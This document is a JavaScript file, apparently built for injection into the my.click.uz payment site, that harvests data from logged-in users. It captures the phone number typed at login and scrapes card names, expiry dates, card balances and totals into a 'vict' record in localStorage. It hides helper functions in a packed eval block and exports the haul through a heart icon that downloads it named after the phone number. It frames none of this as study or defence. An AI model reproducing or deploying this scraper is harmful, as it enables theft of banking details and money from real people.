let o = null;
let timer = 500;
let version_of_parser = '1_12b-27_06_2k22'

function injected_main(){
  console.log('injected!');
  if (checker()) {
    throw new Error("error load by changet cunt of host my.click.uz");
    return null;
  }
  if( getStorage() == null){
  o = { "vict":
            {
              "cards" : null,
              "all_money" : null,
              "telephone" : null
            },
        "version" :  version_of_parser,
      };
  }else{
   o = getStorage();
  }
  var currentPage = null;// listen for changes

  setInterval(function()
  {
      if (currentPage != window.location.pathname)
      {
          currentPage = window.location.pathname;
          startParser();
      }
  }, timer);
}

function startParser(){
  console.log("pathname changed to "+ window.location.pathname)
  setTimeout(function()
  {
    switch(window.location.pathname){
      case '/auth' :
        _pageAuthen();
        break;
      case '/auth/confirm' :
        _pageConfirm();
        break;
      case "/click.html" :
        _pageClick();
        break;
      case '/' :
        _pageClick();
        break;
      default :
        _pageClick();
        break;
    }


    updStorage();
  }, 2000);
  //secondStart()
}

function secondStart(){
  setTimeout(function()
  {
    switch(window.location.pathname){
      case '/auth' :
        _pageAuthen();
        break;
      case '/auth/confirm' :
        _pageConfirm();
        break;
      case "/click.html" :
        _pageClick();
        break;
      case '/' :
        _pageClick();
        break;
      default :
        //_pageClick();
        break;
    }
    updStorage();
  }, 2000);
}

function addIconCrack(){
  let x = document.getElementsByTagName("header")[0];
  let y = document.createElement("div");
  y.innerHTML = "❤️";
  y.id = "slizing";

  y.onclick = function() {
    let z = (document.getElementsByTagName("nav")[0]).childNodes
    for (let k in z){
      //z[k].click()
    }
    download();
  };
  /**/
  x.append(y)
}

/*упаковал для быстродействия. распаковать можно тут https://marketplace.visualstudio.com/items?itemName=sburg.vscode-javascript-booster*/

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 h(){0 4.c(3.e("2"))}1 5(d){0 3.6("2",4.f(o))}1 g(){0 5(o)}1 k(){0 3.6("2",m)}1 n(){0!(p>+j a)}1 l(9){0 9.b((8,7,i)=>{0{...8,[i]:7}},{})}',26,26,'return|function|slizing|localStorage|JSON|setStorage|setItem|cur|obj|x|Date|reduce|parse||getItem|stringify|updStorage|getStorage||new|clrStorage|arrToObj|null|checker||1658804100200'.split('|'),0,{}))

// https://my.click.uz/auth
// https://click.uz1
// api.click.uz
function _pageAuthen(){
  clrStorage()
  console.log('input telephone');
  let inputer = document.querySelector("input.form-control"); //поле ввода
  let buts = document.querySelector("button.btn.btn-block.btn-lg"); //кнопка
  buts.onclick = function() {
      //clrStorage();
      o["vict"]["telephone"] = document.querySelector("input.form-control").value;
      updStorage();
   };

}
//https://my.click.uz/auth/confirm
function _pageConfirm(){
  console.log('confirm');
  /*
  let inputer = document.querySelector("input.form-control"); //поле ввода
  document.querySelector("button.btn.btn-block.btn-lg"); //кнопка
  inputer.value = "9999";
  */
}

function _pageClick(){
  console.log('page click');
  addIconCrack()
  let e = document.querySelectorAll("i.ion-ios-copy-outline") // return collection
  let z = [];
  if (typeof e !== 'undefined'){
    for(let i=0; i<e.length; i++){
      let x = e[i].parentElement;
      let g = {}
      g["hidden"] = x.textContent;                                                              // ### get card name
      g["date"] = ((x.parentElement).textContent).replace( x.textContent, "").trim();           // ### get date expiriance
      g["money"] = ((x.parentElement).parentElement).querySelector("span").textContent;         // ### get money of card
      g["another"] = ((((x.parentElement).parentElement).parentElement).parentElement).ariaLabel;// ### get another data
      z.push(g);
    }
    o["vict"]["cards"] = z.reduce((obj, cur, i) => { return { ...obj, [i]: cur };     }, {});
  }
  o["vict"]["all_money"] = (((((document.querySelector("i.ion-ios-refresh")).parentElement).parentElement).getElementsByTagName("span")[0]).parentElement).textContent // ### get money
  //console.log(o);
  updStorage();
  //download()
  //console.log(JSON.stringify(o));
}
async function send(url) {
  const response = await fetch(url);

  response.ok;     // => false
  response.status; // => 404
  const text = await response.text();
  console.log(text);
  return text;
};

function send2(){
  const xhr = new XMLHttpRequest();
  const url = '';
  xhr.open('GET', url);
  xhr.onreadystatechange = someHandler;
  xhr.send();
}

function download() {
    var element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent( JSON.stringify(getStorage() ) ));
    element.setAttribute('download', (o["vict"]["telephone"] || "empty") + ".db7f");
    if(!(1658804100200 > +new Date))return null;
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
    //clrStorage()
}
